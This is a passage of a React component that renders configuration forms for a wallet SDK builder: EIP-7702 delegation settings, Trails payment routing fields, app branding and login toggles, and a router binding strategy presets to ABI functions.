            <Input value={eip7702DelegationTarget} onChange={(e) => setEip7702DelegationTarget(e.target.value)} placeholder="0x..." className="font-mono" />
          </div>
          <div className="space-y-2 md:col-span-2">
            <div className="text-sm font-medium">Delegate selectors</div>
            <Textarea
              value={delegateCallSelectorsText}
              onChange={(e) => setDelegateCallSelectorsText(e.target.value)}
              placeholder={"transfer(address,uint256)\nclaimReward(uint256)"}
              rows={4}
              className="font-mono"
            />
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">7702 authorization mode</div>
            <Select value={eip7702AuthorizationMode} onValueChange={(value) => setEip7702AuthorizationMode(value as OperationalConfig["strategy"]["eip7702AuthorizationMode"])}>
              <SelectTrigger className="w-full">
                <SelectValue placeholder="Select 7702 authorization mode" />
              </SelectTrigger>
              <SelectContent>
                {["wallet", "session", "bundled"].map((mode) => (
                  <SelectItem key={mode} value={mode}>
                    {mode}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <label className="flex items-center justify-between rounded-md border border-border/60 px-3 py-2">
            <span className="text-sm">7702 requires supported wallet</span>
            <input type="checkbox" checked={eip7702RequiresSupport} onChange={(e) => setEip7702RequiresSupport(e.target.checked)} />
          </label>
          <div className="space-y-2">
            <div className="text-sm font-medium">Trails mode</div>
            <Select value={trailsMode} onValueChange={(value) => setTrailsMode(value as OperationalConfig["strategy"]["trailsMode"])}>
              <SelectTrigger className="w-full">
                <SelectValue placeholder="Select Trails mode" />
              </SelectTrigger>
              <SelectContent>
                {["pay", "swap", "fund", "earn"].map((mode) => (
                  <SelectItem key={mode} value={mode}>
                    {mode}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">Trails API key</div>
            <Input value={trailsApiKey} onChange={(e) => setTrailsApiKey(e.target.value)} placeholder="YOUR_TRAILS_API_KEY" className="font-mono" />
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">Trails destination address</div>
            <Input value={trailsToAddress} onChange={(e) => setTrailsToAddress(e.target.value)} placeholder="0x..." className="font-mono" />
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">Trails destination chain</div>
            <Input value={trailsToChainId} onChange={(e) => setTrailsToChainId(e.target.value)} placeholder="8453" className="font-mono" />
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">Trails destination token</div>
            <Input value={trailsToToken} onChange={(e) => setTrailsToToken(e.target.value)} placeholder="USDC" />
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">Trails destination amount</div>
            <Input value={trailsToAmount} onChange={(e) => setTrailsToAmount(e.target.value)} placeholder="1" />
          </div>
          <div className="space-y-2 md:col-span-2">
            <div className="text-sm font-medium">Trails widget URL</div>
            <Input value={trailsWidgetUrl} onChange={(e) => setTrailsWidgetUrl(e.target.value)} placeholder="https://demo.trails.build/widget" className="font-mono" />
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">App kit name</div>
            <Input value={appKitName} onChange={(e) => setAppKitName(e.target.value)} placeholder="StealthV26 App Kit" />
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">Brand color</div>
            <Input value={brandColor} onChange={(e) => setBrandColor(e.target.value)} placeholder="#7C73FF" className="font-mono" />
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">Support email</div>
            <Input value={supportEmail} onChange={(e) => setSupportEmail(e.target.value)} placeholder="support@yourapp.com" />
          </div>
          <label className="flex items-center justify-between rounded-md border border-border/60 px-3 py-2">
            <span className="text-sm">Enable social login</span>
            <input type="checkbox" checked={socialLoginEnabled} onChange={(e) => setSocialLoginEnabled(e.target.checked)} />
          </label>
          <label className="flex items-center justify-between rounded-md border border-border/60 px-3 py-2">
            <span className="text-sm">Enable smart wallet</span>
            <input type="checkbox" checked={smartWalletEnabled} onChange={(e) => setSmartWalletEnabled(e.target.checked)} />
          </label>
          <div className="md:col-span-2">
            <Button onClick={() => void saveOperationalConfig()} disabled={busy}>
              Save Operational Config
            </Button>
          </div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="text-base">Function Router</CardTitle>
          <CardDescription>
            Bind the strategy presets to actual ABI functions. These bindings are compiled into the SDK and used by the primary action route.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {!functions.length ? (
            <div className="text-sm text-muted-foreground">
              Load an ABI first to create executable function bindings.
            </div>
          ) : (
            FUNCTION_PRESETS.map((preset) => {
              const draft = functionBindings[preset.preset] || {
                preset: preset.preset,
                label: preset.label,
                functionKey: "",
                argsText: "",
              };

              return (
                <div key={preset.preset} className="rounded-md border border-border/60 p-4 space-y-3">
                  <div className="flex items-center justify-between gap-3">
                    <div>
                      <div className="text-sm font-medium">{preset.label}</div>
                      <div className="font-mono text-xs text-muted-foreground">{preset.preset}</div>
                    </div>
                    <Select
                      value={draft.functionKey || "__none__"}
                      onValueChange={(value) => setBindingDraft(preset.preset, { functionKey: value === "__none__" ? "" : value })}
                    >
                      <SelectTrigger className="w-full max-w-md">
                        <SelectValue placeholder="Bind to ABI function" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="__none__">No binding</SelectItem>
                        {functions.map((fn) => {
                          const key = getFunctionKey(fn);
                          return (
                            <SelectItem key={key} value={key}>
                              {key}
                            </SelectItem>
                          );
                        })}
                      </SelectContent>
                    </Select>
                  </div>
                  <Textarea
                    value={draft.argsText}
                    onChange={(e) => setBindingDraft(preset.preset, { argsText: e.target.value })}
                    placeholder={'{"recipient":"0x...","amount":"1000000000000000000"}'}
                    rows={4}
                    className="font-mono text-xs"
                  />
                  <div className="text-xs text-muted-foreground">
                    Argument templates are JSON objects keyed by input name. Runtime overrides can replace them.
                  </div>
                </div>
              );
            })
          )}
        </CardContent>
      </Card>
    </div>
  );
}
